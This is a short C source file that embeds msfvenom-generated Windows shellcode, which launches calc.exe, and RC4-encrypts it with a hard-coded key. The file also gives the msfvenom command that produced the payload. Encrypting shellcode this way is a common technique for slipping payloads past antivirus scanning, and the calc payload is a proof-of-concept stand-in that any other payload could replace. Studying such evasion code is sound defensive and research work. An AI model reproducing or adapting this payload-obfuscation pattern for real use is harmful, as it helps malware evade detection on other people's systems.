#include "rc4.h"

void main() {

    // This shellcode will pop calc.exe. Generated with:
    // msfvenom -f c -p windows/exec cmd=calc --bad-chars="\x00"
    unsigned char shellcode[] = 
    "\xbf\xed\x66\x7b\x9d\xdb\xcd\xd9\x74\x24\xf4\x5d\x31\xc9"
    "\xb1\x30\x31\x7d\x13\x83\xed\xfc\x03\x7d\xe2\x84\x8e\x61"
    "\x14\xca\x71\x9a\xe4\xab\xf8\x7f\xd5\xeb\x9f\xf4\x45\xdc"
    "\xd4\x59\x69\x97\xb9\x49\xfa\xd5\x15\x7d\x4b\x53\x40\xb0"
    "\x4c\xc8\xb0\xd3\xce\x13\xe5\x33\xef\xdb\xf8\x32\x28\x01"
    "\xf0\x67\xe1\x4d\xa7\x97\x86\x18\x74\x13\xd4\x8d\xfc\xc0"
    "\xac\xac\x2d\x57\xa7\xf6\xed\x59\x64\x83\xa7\x41\x69\xae"
    "\x7e\xf9\x59\x44\x81\x2b\x90\xa5\x2e\x12\x1d\x54\x2e\x52"
    "\x99\x87\x45\xaa\xda\x3a\x5e\x69\xa1\xe0\xeb\x6a\x01\x62"
    "\x4b\x57\xb0\xa7\x0a\x1c\xbe\x0c\x58\x7a\xa2\x93\x8d\xf0"
    "\xde\x18\x30\xd7\x57\x5a\x17\xf3\x3c\x38\x36\xa2\x98\xef"
    "\x47\xb4\x43\x4f\xe2\xbe\x69\x84\x9f\x9c\xe7\x5b\x2d\x9b"
    "\x45\x5b\x2d\xa4\xf9\x34\x1c\x2f\x96\x43\xa1\xfa\xd3\xbc"
    "\xeb\xa7\x75\x55\xb2\x3d\xc4\x38\x45\xe8\x0a\x45\xc6\x19"
    "\xf2\xb2\xd6\x6b\xf7\xff\x50\x87\x85\x90\x34\xa7\x3a\x90"
    "\x1c\xc4\xdd\x02\xfc\x0b";

    // Can change "Secret" password to anything <= 256 bytes in length
    char* encrypted_shellcode = rc4_encrypt_decrypt(shellcode, sizeof(shellcode), "Secret", true);

}

